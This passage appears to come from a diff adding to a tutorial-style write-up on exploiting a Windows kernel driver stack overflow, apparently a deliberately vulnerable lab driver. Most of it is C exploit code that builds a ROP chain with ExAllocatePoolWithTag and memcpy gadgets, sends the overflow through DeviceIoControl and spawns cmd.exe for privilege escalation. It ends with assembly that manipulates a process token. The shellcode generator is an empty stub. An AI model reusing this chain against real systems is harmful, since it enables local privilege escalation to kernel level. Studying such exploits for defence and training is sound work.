+	printf("Primary token: %xu \n", (ULONGLONG)kernel_PsReferencePrimaryToken - kernel_base_addr);
+	printf("PsReferencePrimaryToken base addr: %xu\n", (ULONGLONG) kernel_PsReferencePrimaryToken - (ULONGLONG) kernel_base_addr);
+}
+
+//Spawns a new cmd and returns the pid for the process
+DWORD spawnCmd() {
+	STARTUPINFO si;
+	PROCESS_INFORMATION pi;
+	char cmd[] = "C:\\Windows\\System32\\cmd.exe";
+
+	ZeroMemory(&si, sizeof(si));
+	si.cb = sizeof(si);
+	ZeroMemory(&pi, sizeof(pi));
+
+	// Start the child process. 
+	if (!CreateProcess(NULL,	// No module name (use command line)
+		cmd,					// Command line
+		NULL,					// Process handle not inheritable
+		NULL,					// Thread handle not inheritable
+		FALSE,					// Set handle inheritance to FALSE
+		CREATE_NEW_CONSOLE,     // No creation flags
+		NULL,					// Use parent's environment block
+		NULL,					// Use parent's starting directory 
+		&si,					// Pointer to STARTUPINFO structure
+		&pi)					// Pointer to PROCESS_INFORMATION structure
+		)
+	{
+		printf("CreateProcess failed (%d).\n", GetLastError());
+		return -1;
+	}
+
+	return pi.dwProcessId;
+}
+
+
+char *generate_shellcode() {
+	//Generates and returns a shellcode to be executed after the ROP chain. This shellcode will elevate privileges.
+}
+
+void do_buffer_overflow(HANDLE h)
+{
+	SIZE_T in_buffer_size = 2072 + 8 * 15 + 0x20; // 2072 is the offset; there are 15 8-byte long gadgets and an add rsp, 0x20.
+	//Allocates memory for buffer
+	PULONG in_buffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, in_buffer_size);
+	//Fills with AAAAAAA...
+	memset((char *)in_buffer, 'A', in_buffer_size);
+	
+	SIZE_T offset = 2072;
+
+	//Spawns cmd and adjusts the pid
+	pid = spawnCmd();
+	//Adjust gadgets offsets
+	adjust_offsets();
+	//Our shellcode to escalate privileges. To be crafted!
+	char *shellcode = generate_shellcode();
+
+	//Arbitrary size of our shellcode
+	unsigned long long size_of_copy = 0x100;
+
+	
+
+	add_to_payload((char*)in_buffer, &offset, &g_xor_ecx_ecx_mov_rax_rcx_ret, 8);
+	add_to_payload((char*)in_buffer, &offset, &g_pop_rdx_ret, 8);
+	add_to_payload((char*)in_buffer, &offset, &size_of_copy, 8);
+	add_to_payload((char*)in_buffer, &offset, &kernel_ExAllocatePoolWithTag, 8);
+	add_to_payload((char*)in_buffer, &offset, &g_add_rsp_20h_ret, 8);
+	offset += 0x20;
+
+	add_to_payload((char*)in_buffer, &offset, &g_push_rax_pop_rbx_ret, 8);
+	add_to_payload((char*)in_buffer, &offset, &g_push_rax_pop_r13_ret, 8);
+	add_to_payload((char*)in_buffer, &offset, &g_xchg_r8_r13_ret, 8);
+	add_to_payload((char*)in_buffer, &offset, &g_mov_rcx_r8_mov_rax_rcx_ret, 8);
+	add_to_payload((char*)in_buffer, &offset, &g_pop_rdx_ret, 8);
+	add_to_payload((char*)in_buffer, &offset, (unsigned long long *)(&shellcode), 8);
+	add_to_payload((char*)in_buffer, &offset, &g_pop_r8_ret, 8);
+	add_to_payload((char*)in_buffer, &offset, &size_of_copy, 8);
+	add_to_payload((char*)in_buffer, &offset, &kernel_memcpy, 8);
+	add_to_payload((char*)in_buffer, &offset, &g_jmp_rbx, 8);
+	
+
+	system("pause");
+	printf("Sending buffer.\n");
+	//Sends buffer
+	bool result = DeviceIoControl(h, STACK_OVERFLOW_IOCTL_NUMBER, in_buffer, (DWORD)in_buffer_size, NULL, 0, NULL, NULL);
+	if (!result)
+	{
+		printf("IOCTL Failed: %X\n", GetLastError());
+	}
+	HeapFree(GetProcessHeap(), 0, (LPVOID)in_buffer);
+}
+
+
+int main(int argc, char **argv)
+{
+	do_buffer_overflow(get_handle());
+	system("pause");
+}
+
+```
+
+The exploit is getting big. Let me explain some of the functions I have created:
+
+`add_to_payload`: you provide the buffer to which you wish to write, the current offset, the value you wish to copy and the size. It will copy the amount of bytes provided to the buffer at the offset provided and will increment the offset in N, where N is the size provided.
+
+`generate_shellcode`: this function will allocate a buffer in userland, put the shellcode for EoP in it and return the address. Memcpy in our ROP chain will copy the shellcode from the address allocated in this function to a kernel RWX region. 
+
+`spawnCmd`: this spawns a new cmd and returns its pid. This will be the process which privileges we will elevate.  
+
+
+
+
+mov rcx, 0x12345678
+sub rsp, 0x8 
+mov rdx, rsp 
+mov rbx, 0xffffffff00000000
+call rbx
+mov rcx, [rsp]
+mov rbx, 0xffffffff12343210
+call rbx
+add rax, 0x40
+mov rcx, 0xfffffffc
+mov [rax], rcx
+add rax, 0x8 
+mov [rax], rcx
+add rax, 0x8 
+mov [rax], rcx
+add rsp, 0x8 
+~         
